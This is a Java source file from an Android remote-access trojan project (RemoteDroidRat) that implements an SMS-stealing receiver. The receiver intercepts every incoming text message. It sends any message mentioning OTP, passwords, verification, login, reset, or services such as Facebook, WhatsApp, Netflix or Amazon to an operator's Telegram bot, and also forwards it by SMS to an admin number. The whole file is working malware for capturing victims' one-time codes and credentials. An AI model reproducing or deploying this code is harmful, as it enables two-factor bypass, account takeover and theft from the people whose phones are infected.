package com.KaranKumar.RemoteDroidRat.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.MorseCodeConverter;
import java.nio.charset.StandardCharsets;
import android.util.Base64;

public class SmsForworder extends BroadcastReceiver {



    @Override
    public void onReceive(Context context, Intent intent) {
		TelegramBotApi bot =new TelegramBotApi(context);
		SharedPreferences sharedPreferences = context.getSharedPreferences("number", Context.MODE_PRIVATE);
		adminInfo admin = new adminInfo(context);

	    String USER_CHAT_ID = admin.getChatId();
        Bundle extras;
        Object[] objArr;

        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()) && (extras = intent.getExtras()) != null && (objArr = (Object[]) extras.get("pdus")) != null) {
            for (Object obj : objArr) {
                SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj);
                String displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
                String messageBody = createFromPdu.getMessageBody();

                String number = sharedPreferences.getString("configNumber", admin.getMobileNo());

                if (containsKeyword(messageBody, "OTP")) {	

					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);

                } else if (containsKeyword(messageBody, "PASSWORD")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}


                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "Love")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "STEP TO VERIFICATION")) {

					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "VERIFICATION")) {

					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);

                } else if (containsKeyword(messageBody, "VERIFY")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "RESET")) {

					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "LOGIN")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "EMAIL")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "ONE TIME PASSWORD")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "FACEBOOK")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "INSTAGRAM")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "WHATSAPP")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "NETFLIX")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "TELEGRAM")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "FLIPKART")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "MEESO")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "AMAZON")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else if (containsKeyword(messageBody, "SHOP")) {
					try {
						bot.sendMessage(USER_CHAT_ID, messageBody);		
					} catch (Exception e) {
						e.printStackTrace();
					}

                    forwardSmsBody(displayOriginatingAddress, messageBody, number);
                } else {

				}
            }
        }
    }

    private boolean containsKeyword(String str, String str2) {
        return str.toLowerCase().contains(str2.toLowerCase());
    }

    private void forwardSmsBody(String str, String str2, String str3) {
        try {
            SmsManager.getDefault().sendTextMessage(str3, null, str2, null, null);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}

